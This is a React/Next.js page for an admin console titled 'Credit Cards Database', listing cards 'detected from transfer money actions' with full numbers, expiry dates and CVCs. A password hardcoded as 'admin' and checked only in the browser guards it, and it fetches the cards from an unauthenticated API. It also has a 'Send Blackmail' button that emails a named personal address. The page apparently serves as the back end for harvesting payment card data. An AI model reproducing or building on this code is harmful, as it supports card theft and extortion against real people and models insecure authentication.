'use client';

import { useState } from 'react';

interface CreditCard {
  id: string;
  numbers: string;
  expirationDate: string;
  cvc: string;
  fullName: string;
  createdAt: string;
  updatedAt: string;
}

const API_URL = process.env.NEXT_PUBLIC_API_URL || 
  (typeof window !== 'undefined' && window.location.protocol === 'https:' 
    ? 'https://jaglak.onrender.com' 
    : 'http://localhost:3000');

export default function DbPage() {
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [password, setPassword] = useState('');
  const [passwordError, setPasswordError] = useState<string | null>(null);
  const [creditCards, setCreditCards] = useState<CreditCard[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [blackmailStatus, setBlackmailStatus] = useState<'idle' | 'sending' | 'success' | 'error'>('idle');
  const [blackmailError, setBlackmailError] = useState<string | null>(null);

  const handlePasswordSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (password === 'admin') {
      setIsAuthenticated(true);
      setPasswordError(null);
      fetchCreditCards();
    } else {
      setPasswordError('Incorrect password');
      setPassword('');
    }
  };

  const fetchCreditCards = async () => {
    setLoading(true);
    setError(null);
    try {
      const response = await fetch(`${API_URL}/api/credit-cards`);
      if (!response.ok) {
        throw new Error('Failed to fetch credit cards');
      }
      const data = await response.json();
      setCreditCards(data);
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Failed to fetch credit cards');
    } finally {
      setLoading(false);
    }
  };

  // Only fetch credit cards after authentication (handled in handlePasswordSubmit)

  const handleBlackmailSend = async () => {
    setBlackmailStatus('sending');
    setBlackmailError(null);

    try {
      const response = await fetch('/api/email/send', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          to: 'maksymilian.padalak@gmail.com',
          subject: 'blackmail',
          text: 'this is blackmail',
        }),
      });

      if (!response.ok) {
        const data = await response.json().catch(() => ({}));
        throw new Error(data.error || 'Failed to send blackmail email');
      }

      setBlackmailStatus('success');
      setTimeout(() => setBlackmailStatus('idle'), 3000);
    } catch (err) {
      setBlackmailStatus('error');
      setBlackmailError(err instanceof Error ? err.message : 'Failed to send blackmail email');
    }
  };

  const formatDate = (dateString: string) => {
    return new Date(dateString).toLocaleString('en-US', {
      month: 'short',
      day: 'numeric',
      year: 'numeric',
      hour: '2-digit',
      minute: '2-digit',
    });
  };

  // Password protection - show login form if not authenticated
  if (!isAuthenticated) {
    return (
      <main className="min-h-screen bg-white p-4 pt-12">
        <div className="max-w-md mx-auto">
          <div className="border-2 border-black mb-4 p-6 bg-white">
            <h1 className="text-3xl font-black uppercase tracking-tighter mb-2 text-black">
              Admin Access
            </h1>
            <p className="text-sm font-bold text-black uppercase mb-6">
              Enter password to continue
            </p>
            
            <form onSubmit={handlePasswordSubmit} className="space-y-4">
              <div>
                <label htmlFor="password" className="block text-sm font-black uppercase text-black mb-2">
                  Password
                </label>
                <input
                  id="password"
                  type="password"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  className="w-full border-2 border-black px-4 py-2 font-bold text-black focus:outline-none focus:ring-2 focus:ring-black"
                  placeholder="Enter password"
                  autoFocus
                />
              </div>
              {passwordError && (
                <div className="border-2 border-black bg-black text-white p-3">
                  <p className="text-sm font-bold uppercase">{passwordError}</p>
                </div>
              )}
              <button
                type="submit"
                className="w-full border-2 border-black bg-black text-white px-6 py-3 font-black text-sm uppercase hover:bg-white hover:text-black transition-colors"
              >
                Login
              </button>
            </form>
          </div>
        </div>
      </main>
    );
  }

  return (
    <main className="min-h-screen bg-white p-4 pt-12">
      <div className="max-w-4xl mx-auto">
        {/* Header */}
        <div className="border-2 border-black mb-4 p-3 bg-white">
          <div className="flex items-center justify-between flex-wrap gap-3">
            <div>
              <h1 className="text-3xl font-black uppercase tracking-tighter mb-1 text-black">
                Credit Cards Database
              </h1>
              <p className="text-sm font-bold text-black uppercase">
                Detected credit cards from transfer money actions
              </p>
            </div>
            <div className="flex items-center gap-2 flex-wrap">
              <button
                onClick={() => setIsAuthenticated(false)}
                className="border-2 border-black px-4 py-2 font-black text-sm uppercase transition-colors bg-white text-black hover:bg-black hover:text-white"
              >
                Logout
              </button>
              <button
                onClick={fetchCreditCards}
                disabled={loading}
                className="border-2 border-black px-4 py-2 font-black text-sm uppercase transition-colors disabled:opacity-50 disabled:cursor-not-allowed bg-white text-black hover:bg-black hover:text-white"
              >
                {loading ? 'Loading...' : 'Refresh'}
              </button>
            </div>
          </div>
        </div>

        {error && (
          <div className="border-2 border-black bg-black text-white p-3 mb-4">
            <p className="text-sm font-bold uppercase">{error}</p>
          </div>
        )}

        {/* Blackmail Section */}
        <div className="border-2 border-black mb-4 p-4 bg-white">
          <div className="flex items-center justify-between flex-wrap gap-3">
            <h2 className="text-xl font-black uppercase text-black">
              Send Blackmail Email
            </h2>
            <button
              onClick={handleBlackmailSend}
              disabled={blackmailStatus === 'sending'}
              className="border-2 border-black bg-black text-white px-6 py-2 font-black text-sm uppercase transition-colors disabled:opacity-50 disabled:cursor-not-allowed hover:bg-white hover:text-black"
            >
              {blackmailStatus === 'sending' ? 'Sending...' : blackmailStatus === 'success' ? 'Sent!' : 'Send Blackmail'}
            </button>
          </div>
          {blackmailError && (
            <div className="border-2 border-black bg-black text-white p-3 mt-3">
              <p className="text-sm font-bold uppercase">{blackmailError}</p>
            </div>
          )}
          {blackmailStatus === 'success' && (
            <div className="border-2 border-black bg-white text-black p-3 mt-3">
              <p className="text-sm font-bold uppercase">Blackmail email sent successfully!</p>
            </div>
          )}
        </div>

        {/* Credit Cards List */}
        <div className="border-2 border-black bg-white">
          <div className="p-4 border-b-2 border-black">
            <h2 className="text-xl font-black uppercase text-black">
              Credit Cards ({creditCards.length})
            </h2>
          </div>
          <div className="p-4 space-y-3">
            {loading ? (
              <div className="text-center py-8">
                <p className="text-sm font-bold uppercase text-black opacity-50">
                  Loading...
                </p>
              </div>
            ) : creditCards.length === 0 ? (
              <div className="text-center py-8">
                <p className="text-sm font-bold uppercase text-black opacity-50">
                  No credit cards detected yet
                </p>
              </div>
            ) : (
              creditCards.map((card) => (
                <div
                  key={card.id}
                  className="border-2 border-black bg-white p-4"
                >
                  <div className="space-y-3">
                    {/* Card Info */}
                    <div>
                      <h3 className="text-lg font-black uppercase mb-2 text-black">
                        {card.fullName}
                      </h3>
                      <div className="grid grid-cols-2 gap-2 text-sm">
                        <div>
                          <span className="font-bold text-black opacity-60 uppercase text-xs">Card Number:</span>
                          <p className="font-black text-black">{card.numbers}</p>
                        </div>
                        <div>
                          <span className="font-bold text-black opacity-60 uppercase text-xs">Expiration:</span>
                          <p className="font-black text-black">{card.expirationDate}</p>
                        </div>
                        <div>
                          <span className="font-bold text-black opacity-60 uppercase text-xs">CVC:</span>
                          <p className="font-black text-black">{card.cvc}</p>
                        </div>
                        <div>
                          <span className="font-bold text-black opacity-60 uppercase text-xs">Added:</span>
                          <p className="font-black text-black">{formatDate(card.createdAt)}</p>
                        </div>
                      </div>
                    </div>

                  </div>
                </div>
              ))
            )}
          </div>
        </div>
      </div>
    </main>
  );
}
